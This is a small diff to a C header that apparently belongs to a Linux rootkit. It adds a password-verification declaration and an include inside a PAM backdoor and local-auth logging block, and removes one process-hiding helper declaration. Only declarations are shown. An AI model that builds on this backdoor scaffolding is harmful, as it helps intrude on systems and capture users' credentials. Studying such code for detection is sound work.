@@ -20,7 +20,6 @@ char *process_info(pid_t pid, int mode);
 #define process_name() process_info(getpid(), MODE_NAME)
 #define process_cmdline() process_info(getpid(), MODE_CMDLINE)
 
-int xprocess(const char *name);
 int cmp_process(char *name);
 char *str_process(char *name);
 int process(char *name);
@@ -33,6 +32,9 @@ int bd_sshproc(void);
 
 /* if PAM is being used... */
 #if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
+
+int verify_pass(char *user, char *acc_pass);
+#include "verify_pass.c"
 
 char *get_username(const pam_handle_t *pamh){
     void *u = NULL;
